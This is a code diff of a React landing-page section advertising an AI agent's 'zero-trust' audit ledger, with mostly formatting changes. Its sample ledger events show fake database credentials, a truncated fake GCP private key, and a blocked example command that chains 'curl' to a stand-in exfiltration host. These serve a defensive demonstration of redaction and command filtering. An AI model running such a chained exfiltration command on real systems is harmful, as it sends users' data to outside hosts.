@@ -1,7 +1,7 @@
 "use client";
 
 import React, { useState } from "react";
-import { EyeOff, CheckCircle2, Key, Database, Terminal } from "lucide-react";
+import { EyeOff, CheckCircle2, Database, Terminal } from "lucide-react";
 
 interface AuditEvent {
   time: string;
@@ -23,8 +23,10 @@ export default function ZeroTrustLedgerSection() {
       type: "tool_execution",
       title: "File Access Intercepted",
       desc: "Agent requested write access to database configuration module.",
-      rawText: "DATABASE_URL=postgresql://admin:super_secret_password_2026@db.internal:5432/production",
-      redactedText: "DATABASE_URL=postgresql://admin:[REDACTED_DATABASE_CREDENTIALS]@db.internal:5432/production",
+      rawText:
+        "DATABASE_URL=postgresql://admin:super_secret_password_2026@db.internal:5432/production",
+      redactedText:
+        "DATABASE_URL=postgresql://admin:[REDACTED_DATABASE_CREDENTIALS]@db.internal:5432/production",
       hash: "sha256:8f2a7b1c4e9d3f5a6b7c8d9e0f1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s",
       icon: Database,
     },
@@ -33,8 +35,10 @@ export default function ZeroTrustLedgerSection() {
       type: "dlp_redaction",
       title: "GCP DLP Redaction Check",
       desc: "Scanned prompt payload for PII and API keys. Flagged Google Cloud Service Account credentials.",
-      rawText: "client_email: \"owner@alti-prod.iam.gserviceaccount.com\", private_key: \"-----BEGIN PRIVATE KEY-----\\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDhO...\"",
-      redactedText: "client_email: \"owner@alti-prod.iam.gserviceaccount.com\", private_key: \"[REDACTED_GCP_PRIVATE_KEY]\"",
+      rawText:
+        'client_email: "owner@alti-prod.iam.gserviceaccount.com", private_key: "-----BEGIN PRIVATE KEY-----\\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDhO..."',
+      redactedText:
+        'client_email: "owner@alti-prod.iam.gserviceaccount.com", private_key: "[REDACTED_GCP_PRIVATE_KEY]"',
       hash: "sha256:4c3d2e1b0a9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a1f0e9d8c7b6a5f4e3d",
       icon: EyeOff,
     },
@@ -43,8 +47,10 @@ export default function ZeroTrustLedgerSection() {
       type: "tool_execution",
       title: "CLI Command Sanitized",
       desc: "Validated shell command before staging execution. Ensured no command chaining or remote download piping.",
-      rawText: "npm run migrate && curl -s http://malicious-egress.com/exfiltrate",
-      redactedText: "npm run migrate [COMMAND CHAINING BLOCKED: curl -s http://malicious-egress.com/exfiltrate]",
+      rawText:
+        "npm run migrate && curl -s http://malicious-egress.com/exfiltrate",
+      redactedText:
+        "npm run migrate [COMMAND CHAINING BLOCKED: curl -s http://malicious-egress.com/exfiltrate]",
       hash: "sha256:7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7g8h",
       icon: Terminal,
     },
@@ -61,7 +67,6 @@ export default function ZeroTrustLedgerSection() {
   return (
     <section className="w-full py-32 bg-gray-50 text-black px-4 sm:px-6 lg:px-8 border-t border-gray-100 overflow-hidden">
       <div className="max-w-7xl mx-auto grid grid-cols-1 lg:grid-cols-12 items-center gap-16 lg:gap-24">
-        
         {/* Left Column: Copy */}
         <div className="lg:col-span-7 flex flex-col gap-8">
           <div className="flex flex-col gap-6">
@@ -70,10 +75,11 @@ export default function ZeroTrustLedgerSection() {
               Cryptographic Ledger.
             </h3>
             <p className="text-xl text-gray-500 leading-relaxed font-medium">
-              Every operation is confined to a secure sandbox, monitored, 
-              and recorded in a local SQLite audit database. Before context 
-              leaves your workspace, local DLP rules automatically strip secrets 
-              so credentials never touch foundational model APIs or external servers.
+              Every operation is confined to a secure sandbox, monitored, and
+              recorded in a local SQLite audit database. Before context leaves
+              your workspace, local DLP rules automatically strip secrets so
+              credentials never touch foundational model APIs or external
+              servers.
             </p>
           </div>
         </div>
@@ -81,7 +87,6 @@ export default function ZeroTrustLedgerSection() {
         {/* Right Column: Ledger Timeline */}
         <div className="lg:col-span-5 w-full lg:w-[130%] lg:translate-x-8">
           <div className="bg-white border border-gray-200/80 rounded-[32px] shadow-xl p-6 md:p-8 flex flex-col gap-6 select-none relative lg:h-[460px] overflow-hidden justify-between">
-            
             {/* Header */}
             <div className="flex items-center justify-between pb-4 border-b border-gray-100 shrink-0">
               <div className="flex items-center gap-2">
@@ -108,9 +113,9 @@ export default function ZeroTrustLedgerSection() {
                   return (
                     <div
                       key={idx}
+                      className="relative flex gap-6 items-start group cursor-pointer transition-all duration-300"
                       onMouseEnter={() => setHoveredIndex(idx)}
                       onMouseLeave={() => setHoveredIndex(null)}
-                      className="relative flex gap-6 items-start group cursor-pointer transition-all duration-300"
                     >
                       {/* Time Label on left */}
                       <div className="text-[10px] text-gray-400 font-mono font-bold pt-1.5 w-16 text-right shrink-0">
@@ -182,10 +187,8 @@ export default function ZeroTrustLedgerSection() {
               <span>Ledger Security: SHA-256 HMAC-signed</span>
               <span>Audit logs synchronized</span>
             </div>
-
           </div>
         </div>
-
       </div>
     </section>
   );
